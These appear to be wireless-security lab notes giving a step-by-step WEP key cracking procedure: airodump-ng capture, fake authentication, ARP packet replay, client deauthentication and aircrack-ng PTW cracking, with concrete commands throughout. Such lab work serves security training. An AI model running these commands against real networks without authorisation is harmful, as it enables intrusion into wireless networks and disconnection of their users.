# Is ENC WEP? yes
# Is CIPHER WEP? yes
# Is AUTH OPN/SKA? yes
# are there multiple clients attached to network? yes

# lab manual page 216
# Attack client instead of access port

###############################################
# Interactive packet replay attack            #
###############################################
# STEP 1: dump traffic for our target AP
airodump-ng -c 8 --bssid 4C:60:DE:4A:62:80 -w clientwep mon0
# STEP 2: fake auth
aireplay-ng -1 0 -e hostileNetwork2g -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
# STEP 3: interactive packet replay attack
# try to capture a packet of specified requirements
# -2 interactive packet replay attack
# -b BSSID
# -d broadcast address FF:FF:FF:FF:FF:FF
# -f 1 filter for packets with from ds bitset
# -m minimum arp packet size
# -n max packet size
aireplay-ng -2 -b <BSSID> -d -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0
aireplay-ng -2 -b 4C:60:DE:4A:62:80 -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0

# NOTE NOTE NOTE: if replay is not generating data try below
aireplay-ng -2 -b 4C:60:DE:4A:62:80 -d FF:FF:FF:FF:FF:FF -f 1 -p 0841 mon0



# alternate file use to find arp packet instead of listening for a new arp
aireplay-ng -2 -r <replay_file>  mon0
aireplay-ng -2 -r replay_src-0416-123051.cap  mon0
# may need to ping from a client or wait for a client to arp, possible to do a deauth to force arp
# aireplay -0 1 -a <BSSID> -c <CLIENT_MAC> mon0 
# aireplay-ng -0 10 -a 4C:60:DE:4A:62:80  -c 8C:85:90:43:C5:E5 mon0

# STEP 4: crack wep key once we have 20k+ #data
# -0 color
# -z ptw attack
# -n number of bits in key
aircrack-ng -0 -z -n 64 <output file>
##################### END #####################
###############################################